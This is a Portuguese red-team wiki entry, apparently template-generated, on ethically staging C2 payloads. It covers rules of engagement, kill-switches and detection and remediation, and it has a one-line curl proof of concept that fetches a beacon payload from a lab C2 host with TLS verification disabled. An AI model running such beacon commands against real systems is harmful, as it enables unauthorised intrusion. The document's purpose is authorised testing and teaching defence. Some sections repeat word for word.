---
id: "0336"
categoria: "17-redteam"
familia: "rt-c2"
slug: "payload"
angulo: "base"
mitre: ""
owasp: ""
tags: ["17-redteam", "rt-c2", "base"]
aliases: ["payload staging ético", "payload"]
---

# payload staging ético

## Contexto

C2 em red team deve priorizar ROE, kill-switch, allowlists de beacon e evitar
impacto em disponibilidade. OpSec inclui metadados de infraestrutura, categorificação de domínios
e alinhamento com detection goals do purple team.

## Detalhe

- **Code signing labs** — muda ruído e o que entra no PDF.

## Execução

1. Definir canais permitidos (HTTPS, DNS, etc.).
2. Infra com segregação e burndown plan.
3. Payloads assinados apenas em alvos autorizados.
4. Telemetria mínima necessária para objetivos.
5. Desmobilizar infra ao final.

## PoC mínimo

```bash
# C2 lab — kill-switch e janela
curl -sk https://c2.lab.local/payload/beacon -H 'X-Session: 90862f'
# só conta teste; sem persistência fora do ROE
```

## OpSec

Não uso infra de C2 criminal. Não aponte para fora do escopo.

## Cuidados

Não uso infra de C2 criminal. Não aponte para fora do escopo.

## Fechamento

| | |
|---|---|
| Detecção | CDN/proxy anomalies; beacon jitter patterns; JA3. |
| Remediação | Allowlist egress; TLS inspection onde adequado; DNS control. |
| Evidência | Diagrama de infra; IOCs entregues ao blue; timeline. |

## Refs

- [Red team ethics / ROE](https://attack.mitre.org/)
- [MITRE ATT&CK — Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Relacionadas

- [payload staging ético — evidência](0716-rt-c2-payload--evidencia.md)
- [debrief com SOC](0340-rt-c2-debrief.md)
- [DNS C2](0332-rt-c2-dns.md)
- [domain fronting histórico](0333-rt-c2-domain-front.md)
- [exfil controlada de dados fake](0339-rt-c2-exfil.md)